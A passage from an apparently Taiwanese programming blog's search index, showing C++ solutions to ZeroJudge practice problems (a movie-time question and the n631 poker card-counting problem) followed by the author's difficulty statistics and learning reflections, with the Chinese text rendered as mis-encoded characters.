class="string">&quot; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="built_in">setw</span>(<span class="number">2</span>) &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; m &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="function">vector&lt;movtime&gt; <span class="title">times</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; times[i].h &gt;&gt; times[i].m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    movtime now;</span><br><span class="line">    cin &gt;&gt; now.h &gt;&gt; now.m;</span><br><span class="line">    <span class="type">int</span> ntm = now.<span class="built_in">tm</span>() + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> movtime&amp; movie : times) &#123;</span><br><span class="line">        <span class="keyword">if</span> (movie.<span class="built_in">tm</span>() &gt;= ntm) &#123;</span><br><span class="line">            movie.<span class="built_in">print</span>();</span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Too Late&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="n631-æ’²å…‹-Poker"><a href="#n631-æ’²å…‹-Poker" class="headerlink" title="n631. æ’²å…‹ (Poker)"></a>n631. æ’²å…‹ (Poker)</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=n631">https://zerojudge.tw/ShowProblem?problemid=n631</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šçµ±è¨ˆèˆ‡æ•¸å­¸é‚è¼¯ï¼ˆåŒ…å«éŒ¯èª¤æ€è·¯çš„åæ€ï¼‰</p>
<p><strong>ğŸ’¡ è§£é¡Œå¿ƒå¾—</strong>ï¼šé€™é¡Œæˆ‘ä¸€é–‹å§‹ç†è§£éŒ¯èª¤ï¼Œç”¨æ’åºè§€å¯Ÿçš„æ–¹å¼ä¼°ç®—ï¼Œå¯¦éš›ä¸Šæ‡‰è©²ç”¨ã€Œæ¯å€‹ç‰Œè™Ÿå‡ºç¾æ¬¡æ•¸ã€ä¾†ç²¾æº–è¨ˆç®—ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ­£è§£</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">53</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="type">int</span> k;</span><br><span class="line">        cin &gt;&gt; k;</span><br><span class="line">        cnt[k]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> last = *<span class="built_in">min_element</span>(cnt.<span class="built_in">begin</span>() + <span class="number">1</span>, cnt.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> most = *<span class="built_in">max_element</span>(cnt.<span class="built_in">begin</span>() + <span class="number">1</span>, cnt.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> tn = most * <span class="number">52</span>;</span><br><span class="line">    <span class="type">int</span> add = tn - n;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; last &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; add &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ğŸ“ˆ-è§£é¡Œçµ±è¨ˆèˆ‡å¿ƒå¾—"><a href="#ğŸ“ˆ-è§£é¡Œçµ±è¨ˆèˆ‡å¿ƒå¾—" class="headerlink" title="ğŸ“ˆ è§£é¡Œçµ±è¨ˆèˆ‡å¿ƒå¾—"></a>ğŸ“ˆ è§£é¡Œçµ±è¨ˆèˆ‡å¿ƒå¾—</h2><h3 id="ğŸ¯-æŒ‰é›£åº¦åˆ†å¸ƒ"><a href="#ğŸ¯-æŒ‰é›£åº¦åˆ†å¸ƒ" class="headerlink" title="ğŸ¯ æŒ‰é›£åº¦åˆ†å¸ƒ"></a>ğŸ¯ <strong>æŒ‰é›£åº¦åˆ†å¸ƒ</strong></h3><ul>
<li><strong>ğŸŸ¢ åŸºç¤å…¥é–€</strong>ï¼š15 é¡Œ (37.5%)</li>
<li><strong>ğŸ”µ æ¿æ©‹é«˜ä¸­æ•™å­¸é¡Œ</strong>ï¼š5 é¡Œ (12.5%)</li>
<li><strong>ğŸŸ¡ é€²éšæ¼”ç®—æ³•</strong>ï¼š3 é¡Œ (7.5%)</li>
<li><strong>ğŸ”´ APCS ç«¶è³½é¡Œ</strong>ï¼š4 é¡Œ (10%)</li>
<li><strong>ğŸŸ  TOI ç·´ç¿’è³½</strong>ï¼š3 é¡Œ (7.5%)</li>
</ul>
<h3 id="ğŸ’­-è§£é¡Œå¿ƒå¾—"><a href="#ğŸ’­-è§£é¡Œå¿ƒå¾—" class="headerlink" title="ğŸ’­ è§£é¡Œå¿ƒå¾—"></a>ğŸ’­ <strong>è§£é¡Œå¿ƒå¾—</strong></h3><ol>
<li><strong>åŸºç¤å¾ˆé‡è¦</strong>ï¼šå¾ a001 åˆ° a006 çš„åŸºç¤é¡ŒåŸ¹é¤Šäº†å° C++ èªæ³•çš„ç†Ÿæ‚‰åº¦</li>
<li><strong>æ•¸å­¸æ€ç¶­</strong>ï¼šè¨±å¤šé¡Œç›®éœ€è¦å°‡å•é¡ŒæŠ½è±¡åŒ–ç‚ºæ•¸å­¸æ¨¡å‹</li>
<li><strong>ç®—æ³•ç†è§£</strong>ï¼šAPCS é¡Œç›®éœ€è¦æ›´æ·±å±¤çš„ç®—æ³•æ€è€ƒ</li>
<li><strong>éŒ¯èª¤åæ€</strong>ï¼šå¦‚ n631 æ’²å…‹ç‰Œé¡Œï¼Œè¨˜éŒ„éŒ¯èª¤æ€è·¯æœ‰åŠ©æ–¼é¿å…é‡è¤‡çŠ¯éŒ¯</li>
</ol>
<h3 id="ğŸš€-æŠ€è¡“æˆé•·è»Œè·¡"><a href="#ğŸš€-æŠ€è¡“æˆé•·è»Œè·¡" class="headerlink" title="ğŸš€ æŠ€è¡“æˆé•·è»Œè·¡"></a>ğŸš€ <strong>æŠ€è¡“æˆé•·è»Œè·¡</strong></h3><ul>
<li><strong>éšæ®µä¸€</strong>ï¼šåŸºæœ¬èªæ³•èˆ‡è¼¸å…¥è¼¸å‡º</li>
<li><strong>éšæ®µäºŒ</strong>ï¼šæ¢ä»¶åˆ¤æ–·èˆ‡è¿´åœˆæ‡‰ç”¨</li>
<li><strong>éšæ®µä¸‰</strong>ï¼šé™£åˆ—èˆ‡å­—ä¸²è™•ç†</li>
<li><strong>éšæ®µå››</strong>ï¼šæ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹</li>
<li><strong>éšæ®µäº”</strong>ï¼šç«¶è³½é¡Œç›®çš„ç¶œåˆæ‡‰ç”¨</li>
</ul>
<h3 id="ğŸ“-å­¸ç¿’æ”¶ç©«"><a href="#ğŸ“-å­¸ç¿’æ”¶ç©«" class="headerlink" title="ğŸ“ å­¸ç¿’æ”¶ç©«"></a>ğŸ“ <strong>å­¸ç¿’æ”¶ç©«</strong></h3><ul>
<li>ç†Ÿç·´æŒæ¡ C++ STL çš„ä½¿ç”¨</li>
<li>åŸ¹é¤Šå°‡å¯¦éš›å•é¡ŒæŠ½è±¡åŒ–çš„èƒ½åŠ›</li>
<li>å»ºç«‹ç³»çµ±æ€§çš„è§£é¡Œæ€ç¶­æ¨¡å¼</li>
<li>å­¸æœƒå¾éŒ¯èª¤ä¸­åæ€æ”¹é€²</li>
</ul>
<hr>
<p><em>ğŸ“ æœ€å¾Œæ›´æ–°ï¼š2025-10-11 15:30:00</em><br><em>ğŸ“Š ç¸½é¡Œæ•¸ï¼š40+ é¡Œ</em><br><em>ğŸ¯ æŒçºŒæ›´æ–°ä¸­â€¦</em></p>
]]></content>
      <categories>
        <category>ç¨‹å¼é–‹ç™¼</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
</search>
